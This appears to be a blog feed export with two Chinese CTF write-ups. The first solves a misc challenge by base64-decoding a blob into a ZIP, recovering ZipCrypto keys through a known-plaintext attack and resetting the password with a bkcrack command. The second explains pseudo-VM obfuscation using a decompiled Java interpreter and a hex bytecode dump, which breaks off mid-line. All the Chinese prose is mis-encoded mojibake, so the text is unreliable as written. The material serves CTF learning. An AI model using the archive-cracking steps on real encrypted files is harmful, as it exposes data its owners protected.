vMh44-PSQ8ybSQYuXrpPVP-GTn782pMc-dbUav4SIGf18s-Sc+rT8Dnhn+ym86eCfgOQmoQEfSQUXDH7yjqyLijGjjIOSRjMhEOBz7+1IuoX9v7VoTI-BLfx27jH9xa8pfBi1ypgSSuX5y43-aRDDkyTXoflL4Kqs7+OPLdXKhJKpnThgCM2q-sbCSoWasFkN7OWf0tZksSdg4OcGWMjTKCY4ksh4RbDhWzxHIYC7u3TpAbhooRINGhx-h7TgfbCCEhMFk+LmLhFQvkQCUhd+pwshggbq1TNSRH25degyPYaYaE-z-cEBnjRj4cW+wp7THD9tUL21KAomaIG8FsY49qKZwe4wCWRAyVdPIN7Dfokd2pUHcdvu7elQzRqgsxmSvY0PlOMFok-rPvdCPCDnmxJR38+9a-yw17X-i9QSwECFAAUAAAACABFUiJYIdNzbG0CAACPAwAAEQBFAAAAAAAAACAAAAAAAAAA0KG-rbXEt9y2t7nKysIubWQKACAAAAAAAAEAGAC7+QntIT3aAbAFmxslPdoBsnmP4rwm2gF1cB0AAW909RzlsI-lh6-nmoTlpYvmlpfmlYXkuosubWRQSwECFAAUAAAACAAkViJYYGB3G7d7AAB2qwAACAA3AAAAAAAAACAAAAC9AgAA1L+z1y5wbmcKACAAAAAAAAEAGAD6bmdBJj3aAX8Y5G0mPdoBUxKQ4rwm2gF1cA8AAdtYd6rpkqXljJkucG5nUEsFBgAAAAACAAIA8QAAAK1+AAAAAA==</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæŠŠä»–base64è§£ç </p><p>è§£ç çš„ç»“æœæ˜¯ä¸€å †ä¹±ç ï¼Œçœ‹æœ€åå¯ä»¥çœ‹åˆ°æœ‰pngï¼ŒPKï¼Œ.mdçš„å­—æ ·ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…</p><p>è½¬æ¢ä¸ºhexï¼Œå¼€å¤´æ˜¯04 14 00 00 00 08 00ï¼Œå†çœ‹ä¸Šé¢çš„æç¤ºï¼Œè¡¥å……å‰ä¸‰ä¸ªå­—ç¬¦ï¼ˆ50 4B 03ï¼‰ï¼Œç„¶åä¸€èµ·å¤åˆ¶åˆ°æ–°æ–‡ä»¶ä¸­ï¼Œå¾—åˆ°æ–°å‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯ä¹‹å‰åŠ å¯†çš„å‹ç¼©åŒ…çš„flagæ–‡ä»¶å¤¹ä¸­çš„ä¸¤ä¸ªæ–‡ä»¶ï¼ŒåŒæ—¶é’¥åŒ™.pngè¡¨ç¤ºè¿™æ˜¯deflate+zipcrypyoï¼Œæ—¢ç„¶æ˜¯zipcrypyoï¼Œå°±å¯ä»¥ç”¨æ˜æ–‡æ”»å‡»ï¼Œä½¿ç”¨archpræ‰¾åˆ°å¯†é’¥ï¼ˆå¯†é’¥æ˜¯ç”±å¯†ç ç”Ÿæˆï¼ŒåŒæ—¶åŠ å¯†ä½¿ç”¨å¯†é’¥ï¼‰ï¼š</p><p>[ 48ff002a 56e00484 380c5c49 ]</p><p>ç„¶åç”¨bkcrackè§£å¯†å‹ç¼©åŒ…</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\bkcrack -C <span class="selector-tag">a</span><span class="selector-class">.zip</span> -k <span class="number">48</span>ff002a <span class="number">56</span>e00484 <span class="number">380</span>c5c49 -U new<span class="selector-class">.zip</span> ok</span><br></pre></td></tr></table></figure><p>å°†åŸå§‹å¯†ç æ¢æˆok</p><p>ç„¶åè§£å¯†å³å¯</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W<span class="number">1</span>sh_y<span class="number">0</span>u_AaaAaaaaaaaaaaa_w<span class="number">0</span><span class="symbol">nderfu1</span>_CTF_jour<span class="symbol">ne9</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> å‹ç¼©åŒ… </tag>
            
            <tag> upx </tag>
            
            <tag> éšæœºæ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_RE_VM</title>
      <link href="/posts/670cb6e7.html"/>
      <url>/posts/670cb6e7.html</url>
      
        <content type="html"><![CDATA[<h2 id="ä¼ªè™šæ‹Ÿæœºä¿æŠ¤">ä¼ªè™šæ‹Ÿæœºä¿æŠ¤</h2><blockquote><p><strong>è™šæ‹Ÿæœº</strong>ï¼ˆè‹±è¯­ï¼švirtual machineï¼‰ï¼Œåœ¨è®¡ç®—æœºç§‘å­¦ä¸­çš„ä½“ç³»ç»“æ„é‡Œï¼Œæ˜¯æŒ‡ä¸€ç§ç‰¹æ®Šçš„è½¯ä»¶ï¼Œå¯ä»¥åœ¨è®¡ç®—æœºå¹³å°å’Œç»ˆç«¯ç”¨æˆ·ä¹‹é—´å»ºç«‹ä¸€ç§ç¯å¢ƒï¼Œè€Œç»ˆç«¯ç”¨æˆ·åˆ™æ˜¯åŸºäºè™šæ‹Ÿæœºè¿™ä¸ªè½¯ä»¶æ‰€å»ºç«‹çš„ç¯å¢ƒæ¥æ“ä½œå…¶å®ƒè½¯ä»¶ã€‚è™šæ‹Ÿæœºï¼ˆVMï¼‰æ˜¯è®¡ç®—æœºç³»ç»Ÿçš„ä»¿çœŸå™¨ï¼Œé€šè¿‡è½¯ä»¶æ¨¡æ‹Ÿå…·æœ‰å®Œæ•´ç¡¬ä»¶ç³»ç»ŸåŠŸèƒ½çš„ã€è¿è¡Œåœ¨ä¸€ä¸ªå®Œå…¨éš”ç¦»ç¯å¢ƒä¸­çš„å®Œæ•´è®¡ç®—æœºç³»ç»Ÿï¼Œèƒ½æä¾›ç‰©ç†è®¡ç®—æœºçš„åŠŸèƒ½ã€‚</p></blockquote><p>å¾ˆæ˜æ˜¾ï¼Œctfä¸­çš„vmæŠ€æœ¯å’Œè™šæ‹Ÿæœºå¹¶ä¸ç›¸åŒï¼Œå´æœ‰ä¸€å®šå…³ç³»</p><p>ä¼ªè™šæ‹Ÿæœºä¿æŠ¤æ˜¯ä¸€ç§æ¨¡æ‹Ÿï¼Œå®ƒå°†ç¨‹åºå¯æ‰§è¡Œä»£ç è½¬æ¢ä¸ºè‡ªå®šä¹‰çš„ä¸­é—´æ“ä½œç (operationcode)ï¼Œå¦‚æœæ“ä½œç æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œå°†å®ƒç§°ä¸º(bytecode)ã€‚ä¸­é—´æ“ä½œç é€šè¿‡æ¨¡æ‹Ÿå™¨æ‰§è¡Œï¼Œå®ç°ç¨‹åºåŸæ¥çš„åŠŸèƒ½ï¼ŒåŒæ—¶é˜»ç¢é€†å‘ã€‚è¿™ä¹Ÿæ˜¯å¤§å¤šæ•°è·¨å¹³å°è¯­è¨€å¯ä»¥æˆç«‹çš„åŸå› ï¼Œå…ˆå°†ä»£ç ç¿»è¯‘æˆä¸­é—´ç ï¼Œè¿™ä¸ªä»£ç å°±å¯ä»¥åœ¨ä»»ä½•æœ‰å¯¹åº”è™šæ‹Ÿæœºçš„åœ°æ–¹æ‰§è¡Œã€‚</p><h3 id="å®ä¾‹">å®ä¾‹</h3><p>JVM</p><p>ä¸¤ä¸ªæ–‡ä»¶</p><p>JVM.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p000;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: JVM */</span></span><br><span class="line"><span class="comment">/* loaded from: JVM.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JVM</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: program */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">byte</span>[] flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(strArr[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        flag = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">        fileInputStream.read(flag);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        m0vm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: vm */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m0vm</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] iArr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span>[] iArr2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; flag.length) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (flag[i]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> flag[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b2</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> iArr2[b];</span><br><span class="line">                    iArr2[b] = iArr2[b2];</span><br><span class="line">                    iArr2[b2] = i3;</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">n_next</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[n_next] = iArr2[n_next] + flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b3] = iArr2[b3] + iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b4</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b4] = iArr2[b4] - flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b5</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b5] = iArr2[b5] - iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b6</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b6] = iArr2[b6] * flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b7</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b7] = iArr2[b7] * iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b8</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b8] = iArr2[b8] / flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b9</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b9] = iArr2[b9] / iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b10</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b10] = iArr2[b10] % flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b11</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b11] = iArr2[b11] % iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b12</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b12] = iArr2[b12] &lt;&lt; flag[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b13</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    iArr2[b13] = iArr2[b13] &lt;&lt; iArr2[flag[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">                    iArr2[flag[i + <span class="number">1</span>]] = bufferedReader.read();</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    iArr[i4] = bufferedReader.read();</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">                    System.out.print((<span class="type">char</span>) iArr2[flag[i + <span class="number">1</span>]]);</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    System.out.print((<span class="type">char</span>) iArr[i2]);</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b14</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b15</span> <span class="operator">=</span> flag[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (iArr2[b14] == <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b15;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">42</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b16</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b17</span> <span class="operator">=</span> flag[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (iArr2[b16] != <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b17;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                    i = flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">52</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    iArr[i5] = iArr2[flag[i + <span class="number">1</span>]];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">53</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    iArr2[flag[i + <span class="number">1</span>]] = iArr[i2];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">54</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    iArr[i6] = flag[i + <span class="number">1</span>];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Byte.MAX_VALUE:</span><br><span class="line">                    bufferedReader.close();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b18</span> <span class="operator">=</span> flag[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b19</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b20</span> <span class="operator">=</span> flag[i + <span class="number">2</span>];</span><br><span class="line">                    flag[i] = (<span class="type">byte</span>) ((flag[i] ^ b19) ^ b20);</span><br><span class="line">                    flag[i + <span class="number">1</span>] = (<span class="type">byte</span>) ((flag[i] ^ b18) ^ b20);</span><br><span class="line">                    flag[i + <span class="number">2</span>] = (<span class="type">byte</span>) ((flag[i + <span class="number">1</span>] ^ b18) ^ b19);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>code.jvm(äºŒè¿›åˆ¶æ–‡ä»¶)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">36</span> <span class="number">20</span> <span class="number">36</span> <span class="number">3</span>E <span class="number">22</span> <span class="number">22</span> <span class="number">08</span> <span class="number">00</span> <span class="number">0</span>A <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">08</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">02</span> <span class="number">20</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">01</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">12</span> <span class="number">2</span>B <span class="number">2</span>C <span class="number">36</span> <span class="number">53</span> <span class="number">36</span> <span class="number">45</span> <span class="number">36</span></span><br><span class="line"><span class="attribute">59</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">7</span>F <span class="number">36</span> <span class="number">4</span>F <span class="number">36</span> <span class="number">4</span>E <span class="number">22</span> <span class="number">22</span> <span class="number">7</span>F <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span></span><br><span class="line"><span class="attribute">7D</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">09</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">36</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span></span><br><span class="line"><span class="attribute">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">0</span>A <span class="number">0</span>C <span class="number">02</span> <span class="number">63</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">15</span> <span class="number">0</span>C</span><br><span class="line"><span class="attribute">02</span> <span class="number">61</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">08</span></span><br><span class="line"><span class="attribute">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">09</span> <span class="number">01</span> <span class="number">01</span> <span class="number">08</span> <span class="number">02</span> <span class="number">07</span> <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">01</span></span><br><span class="line"><span class="attribute">2A</span> <span class="number">02</span> <span class="number">6</span>A <span class="number">08</span> <span class="number">00</span> <span class="number">02</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">01</span> <span class="number">0</span>D <span class="number">01</span> <span class="number">01</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">73</span> <span class="number">2</span>A</span><br><span class="line"><span class="attribute">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">6</span>B <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C</span><br><span class="line"><span class="attribute">01</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">70</span> <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">07</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">62</span></span><br><span class="line"><span class="attribute">2A</span> <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">04</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">0</span>B <span class="number">0</span>C <span class="number">03</span> <span 